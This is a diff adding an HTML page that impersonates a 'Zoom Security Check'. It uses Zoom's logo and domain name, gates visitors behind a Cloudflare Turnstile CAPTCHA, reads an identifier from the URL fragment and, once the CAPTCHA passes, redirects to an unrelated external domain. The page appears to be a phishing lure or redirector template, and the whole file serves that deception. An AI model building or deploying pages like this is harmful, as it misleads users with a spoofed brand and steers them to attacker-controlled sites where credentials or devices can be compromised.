@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoom Security Check</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+  <style>
+    /* Apply base64 image background */
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('data:image/png;base64,YOUR_BASE64_IMAGE_HERE') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: left;
+      padding-left: 50px; /* Adjust to fine-tune alignment */
+    }
+
+    .container {
+      text-align: left;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      margin-bottom: 5px;
+    }
+
+    .logo img {
+      width: 50px;
+      height: 50px;
+      margin-right: 10px;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: bold;
+      margin-top: 5px;
+    }
+
+    .subtext {
+      font-size: 16px;
+      margin-top: 5px;
+      color: #555;
+    }
+
+    .cf-turnstile {
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img data-v-8fe477cc="" src="https://st1.zoom.us/homepage/publish/static-image/zoom-logo.svg" alt="Zoom Logo" width="114" height="26">
+      
+    </div>
+
+    <div class="title">www.zoom.us</div>
+    <div class="subtext">Please stand by while we are checking if the site connection is secure</div>
+
+    <!-- Cloudflare Turnstile widget -->
+    <div class="cf-turnstile" data-sitekey="0x4AAAAAAA29iaw3Ztt0Z3Sk" data-callback="onTurnstileSuccess"></div>
+  </div>
+
+  <script>
+    let randomString = "";
+
+    // Extract values from URL fragment (#randomString)
+    function extractValuesFromURL() {
+      const urlFragment = window.location.hash.substring(1); // Remove the '#' from fragment
+      if (!urlFragment) return;
+      randomString = urlFragment; // Store the extracted string
+    }
+
+    // Callback for successful CAPTCHA completion
+    function onTurnstileSuccess(token) {
+      console.log('Turnstile challenge succeeded, token:', token);
+      console.log("Extracted Random String:", randomString);
+      
+      setTimeout(() => {
+        window.location.href = `https://vfffff.com`;
+      }, 2000); // Redirect after 2 seconds
+    }
+
+    // Run extraction on page load
+    extractValuesFromURL();
+  </script>
+
+  <noscript>
+    <p>Please enable JavaScript to proceed.</p>
+  </noscript>
+
+</body>
+</html>
